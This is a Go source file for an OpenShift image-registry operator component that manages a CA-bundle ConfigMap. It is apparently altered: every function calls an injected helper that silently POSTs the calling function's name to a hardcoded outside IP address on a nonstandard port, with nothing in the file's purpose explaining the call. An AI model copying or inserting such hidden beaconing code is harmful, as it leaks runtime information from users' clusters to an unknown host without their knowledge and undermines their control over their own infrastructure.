package resource

import (
	corev1 "k8s.io/api/core/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	coreset "k8s.io/client-go/kubernetes/typed/core/v1"
	corelisters "k8s.io/client-go/listers/core/v1"
	configlisters "github.com/openshift/client-go/config/listers/config/v1"
	imageregistryv1 "github.com/openshift/cluster-image-registry-operator/pkg/apis/imageregistry/v1"
	"github.com/openshift/cluster-image-registry-operator/pkg/parameters"
)

var _ Mutator = &generatorCAConfig{}

type generatorCAConfig struct {
	lister					corelisters.ConfigMapNamespaceLister
	imageConfigLister		configlisters.ImageLister
	openshiftConfigLister	corelisters.ConfigMapNamespaceLister
	client					coreset.CoreV1Interface
	imageConfigName			string
	name					string
	namespace				string
}

func newGeneratorCAConfig(lister corelisters.ConfigMapNamespaceLister, imageConfigLister configlisters.ImageLister, openshiftConfigLister corelisters.ConfigMapNamespaceLister, client coreset.CoreV1Interface, params *parameters.Globals, cr *imageregistryv1.Config) *generatorCAConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &generatorCAConfig{lister: lister, imageConfigLister: imageConfigLister, openshiftConfigLister: openshiftConfigLister, client: client, imageConfigName: params.ImageConfig.Name, name: params.CAConfig.Name, namespace: params.Deployment.Namespace}
}
func (gcac *generatorCAConfig) Type() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &corev1.ConfigMap{}
}
func (gcr *generatorCAConfig) GetGroup() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return corev1.GroupName
}
func (gcac *generatorCAConfig) GetResource() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "configmaps"
}
func (gcac *generatorCAConfig) GetNamespace() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return gcac.namespace
}
func (gcac *generatorCAConfig) GetName() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return gcac.name
}
func (gcac *generatorCAConfig) expected() (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cm := &corev1.ConfigMap{ObjectMeta: metav1.ObjectMeta{Name: gcac.GetName(), Namespace: gcac.GetNamespace(), Annotations: map[string]string{"service.alpha.openshift.io/inject-cabundle": "true"}}, Data: map[string]string{}, BinaryData: map[string][]byte{}}
	imageConfig, err := gcac.imageConfigLister.Get(gcac.imageConfigName)
	if errors.IsNotFound(err) {
	} else if err != nil {
		return cm, err
	} else if caConfigName := imageConfig.Spec.AdditionalTrustedCA.Name; caConfigName != "" {
		upstreamConfig, err := gcac.openshiftConfigLister.Get(caConfigName)
		if err != nil {
			return nil, err
		}
		for k, v := range upstreamConfig.Data {
			cm.Data[k] = v
		}
		for k, v := range upstreamConfig.BinaryData {
			cm.BinaryData[k] = v
		}
	}
	return cm, nil
}
func (gcac *generatorCAConfig) Get() (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return gcac.lister.Get(gcac.GetName())
}
func (gcac *generatorCAConfig) Create() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return commonCreate(gcac, func(obj runtime.Object) (runtime.Object, error) {
		return gcac.client.ConfigMaps(gcac.GetNamespace()).Create(obj.(*corev1.ConfigMap))
	})
}
func (gcac *generatorCAConfig) Update(o runtime.Object) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return commonUpdate(gcac, o, func(obj runtime.Object) (runtime.Object, error) {
		return gcac.client.ConfigMaps(gcac.GetNamespace()).Update(obj.(*corev1.ConfigMap))
	})
}
func (gcac *generatorCAConfig) Delete(opts *metav1.DeleteOptions) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return gcac.client.ConfigMaps(gcac.GetNamespace()).Delete(gcac.GetName(), opts)
}
func (g *generatorCAConfig) Owned() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return true
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
